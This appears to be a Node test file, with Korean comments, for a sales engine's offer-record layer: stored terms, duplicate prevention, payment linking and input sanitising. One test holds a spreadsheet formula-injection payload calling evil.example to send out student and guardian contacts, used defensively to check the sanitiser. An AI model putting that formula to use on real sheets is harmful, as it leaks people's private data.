'use strict';
/* 제안 봉투 회귀 — 2026-09-08 (판매 설계 §⑥ 걸음 5 · 심문 A2)
 *
 * 무엇을 지키나: **「그때 무엇을 약속했나」를 되짚을 수 있는가.**
 *   제안 한 건마다 가격·보장 문안 판·환불 조건 판·잔여 정원·제안 시각·받은 사람을 남긴다.
 *   그 뒤 값이나 문안이 바뀌어도 이미 보낸 제안은 이 봉투로 판정된다.
 *
 * 🔴 이 시험은 «소스의 그 코드»를 돌린다 — 09-08 에 환불 비율 시험이 복사본을 돌리다
 *   배포 검수에 잡혔다(키 5a0cd71f810f). 같은 실수를 두 번 하지 않는다.
 *   가짜 시트 하나만 물려 실제 함수를 태운다.
 */
const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');

const REPO = path.resolve(__dirname, '..');
const 소스 = fs.readFileSync(path.join(REPO, '엔진_진단.js'), 'utf8');

/* 소스에서 상수와 함수 셋을 떼어 낸다. */
function 봉투층뽑기() {
  const 상수시작 = 소스.indexOf("const OFFER_TAB_ = '제안봉투';");
  assert.ok(상수시작 > 0, '제안 봉투 상수가 소스에 없다');
  const 상수끝 = 소스.indexOf('\n', 소스.indexOf('OFFER_TERMS_VER', 상수시작));
  const 함수시작 = 소스.indexOf('function 제안봉투시트_(ss) {');
  assert.ok(함수시작 > 0, '제안봉투시트_ 가 소스에 없다');
  const 함수끝 = 소스.indexOf('\n}', 소스.indexOf('function 제안봉투상태_', 함수시작));
  assert.ok(함수끝 > 함수시작, '제안봉투상태_ 의 끝을 못 찾았다');
  return 소스.slice(상수시작, 상수끝) + '\n' + 소스.slice(함수시작, 함수끝 + 2);
}

/* 가짜 시트 — appendRow 로 쌓이고 setValue 로 한 칸이 바뀌는 것만 흉내낸다. */
function 판만들기() {
  const rows = [];
  const sh = {
    getLastRow: () => rows.length + 1,
    getRange: (r, c, n, w) => ({
      getValues: () => rows.slice(r - 2, r - 2 + (n || rows.length)),
      setValue: (v) => { rows[r - 2][c - 1] = v; },
    }),
    appendRow: (row) => rows.push(row.slice()),
  };
  const 판 = {
    rows,
    ensureSheet: () => sh,
    SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSpreadsheetTimeZone: () => 'Asia/Seoul' }) },
    Utilities: {
      formatDate: (d, tz, f) => (f.indexOf('ss') >= 0 ? '2026-09-08 09:00:00'
        : f.indexOf('HHmmss') >= 0 ? '20260908-090000' : '2026-09-08 09:00'),
    },
    SYNK_VERSION: 'v9.332',
    /* 소스의 행소독_ 과 같은 일: 문자열이 =·+·-·@ 로 시작하면 앞에 따옴표를 붙여 수식이 안 되게 한다. */
    행소독_: (rows) => {
      const cell = (v) => (typeof v === 'string' && /^[=+\-@]/.test(v) ? "'" + v : v);
      return Array.isArray(rows) ? rows.map((r) => (Array.isArray(r) ? r.map(cell) : cell(r))) : cell(rows);
    },
  };
  const 층 = 봉투층뽑기();
  const f = new Function('ensureSheet', 'SpreadsheetApp', 'Utilities', 'SYNK_VERSION', '행소독_',
    층 + '\nreturn { 만들기: 제안봉투만들기_, 상태: 제안봉투상태_, 칸: 봉투칸_, 판이름: OFFER_TERMS_VER, 헤더: OFFER_HEADERS };');
  판.api = f(판.ensureSheet, 판.SpreadsheetApp, 판.Utilities, 판.SYNK_VERSION, 판.행소독_);
  return 판;
}

test('[v9.332] ① 봉투가 그때 조건 일곱을 남긴다', () => {
  const 판 = 판만들기();
  const r = 판.api.만들기({ 세션번호: 'S1', 진단코드: 'D1', 학생번호: '', 가격: 15, 잔여정원: 9 });
  assert.strictEqual(r.ok, true);
  assert.match(r.봉투번호, /^OF-/);
  const row = 판.rows[0];
  const 칸 = 판.api.칸;
  assert.strictEqual(row[칸('가격')], 15, '가격이 안 남았다');
  assert.strictEqual(row[칸('잔여정원')], 9, '잔여 정원이 안 남았다');
  assert.ok(row[칸('제안시각')], '제안 시각이 비었다');
  assert.ok(row[칸('보장문안판')], '보장 문안 판이 비었다');
  assert.ok(row[칸('환불조건판')], '환불 조건 판이 비었다');
  assert.strictEqual(row[칸('상태')], '보냄');
  assert.strictEqual(row[칸('엔진판')], 'v9.332', '어느 판에서 보낸 제안인지 안 남았다');
});

test('[v9.332] ② 두 번 눌러도 봉투는 하나다 (같은 세션 · 보냄)', () => {
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 9 });
  const b = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 8 });
  assert.strictEqual(b.이미있음, true, '같은 세션에 봉투가 둘이 되면 「그때 약속」이 두 개가 된다');
  assert.strictEqual(b.봉투번호, a.봉투번호);
  assert.strictEqual(판.rows.length, 1);
});

test('[v9.332] ③ 빈 봉투를 안 만든다 — 가격·잔여 정원이 없으면 거절', () => {
  const 판 = 판만들기();
  assert.strictEqual(판.api.만들기({ 세션번호: 'S1', 잔여정원: 9 }).error, 'no-price');
  assert.strictEqual(판.api.만들기({ 세션번호: 'S1', 가격: 15 }).error, 'no-seats');
  assert.strictEqual(판.api.만들기({ 가격: 15, 잔여정원: 9 }).error, 'no-key', '누구에게 보낸 제안인지 없으면 못 만든다');
  assert.strictEqual(판.rows.length, 0);
});

test('[v9.332] ④ 결제와 취소가 봉투에 이어진다', () => {
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 9 });
  assert.strictEqual(판.api.상태(a.봉투번호, '수락', 'PAY-77').ok, true);
  const 칸 = 판.api.칸;
  assert.strictEqual(판.rows[0][칸('상태')], '수락');
  assert.strictEqual(판.rows[0][칸('결제열쇠')], 'PAY-77');
});

test('[v9.332] ⑤ 이미 수락된 봉투를 다시 수락으로 덮지 않는다', () => {
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 9 });
  판.api.상태(a.봉투번호, '수락', 'PAY-77');
  const r = 판.api.상태(a.봉투번호, '수락', '');
  assert.strictEqual(r.그대로, true, '덮으면 결제 열쇠가 지워진다');
  assert.strictEqual(판.rows[0][판.api.칸('결제열쇠')], 'PAY-77');
});

test('[v9.332] ⑥ 모르는 상태·모르는 봉투는 거절한다', () => {
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 9 });
  assert.strictEqual(판.api.상태(a.봉투번호, '아무거나').error, 'bad-state');
  assert.strictEqual(판.api.상태('OF-없음', '수락').error, 'no-envelope');
});

test('[v9.332] ⑧ 시트 소독 통로를 지난다 — 수식으로 시작하는 글이 그대로 안 들어간다', () => {
  /* 🔴 보안 검토 09-08: 이 스프레드시트에 profiles(학생·보호자 연락처)가 함께 산다.
   *   `=IMPORTDATA("...?d="&TEXTJOIN(",",1,profiles!B2:B60))` 한 줄이 셀에 들어가면
   *   사람이 클릭하지 않아도 시트가 스스로 평가해 개인정보가 밖으로 나간다. */
  assert.ok(/sh\.appendRow\(행소독_\(/.test(소스), '봉투 기입이 소독 통로를 안 지난다');
  assert.ok(/setValue\(행소독_\(String\(결제열쇠\)\)\)/.test(소스), '결제 열쇠 기입이 소독 통로를 안 지난다');

  const 판 = 판만들기();
  const 공격 = '=IMPORTDATA("https://evil.example/?d="&TEXTJOIN(",",1,profiles!B2:B60))';
  판.api.만들기({ 세션번호: 공격, 가격: 15, 잔여정원: 9 });
  const 셀 = 판.rows[0][판.api.칸('세션번호')];
  assert.notStrictEqual(셀[0], '=', '수식이 그대로 셀에 들어갔다 — 시트가 스스로 평가한다');
  assert.strictEqual(판.rows[0][판.api.칸('가격')], 15, '소독이 숫자까지 문자열로 바꾸면 안 된다');
});

test('[v9.332] ⑦ 판 이름이 박혀 있다 — 값·문안이 바뀌면 이 문자열도 오른다', () => {
  assert.match(소스, /OFFER_TERMS_VER = 'offer-t\d+-\d{4}-\d{2}-\d{2}'/,
    '그때 조건의 판 이름이 없으면 옛 봉투와 새 봉투를 못 가른다');
});
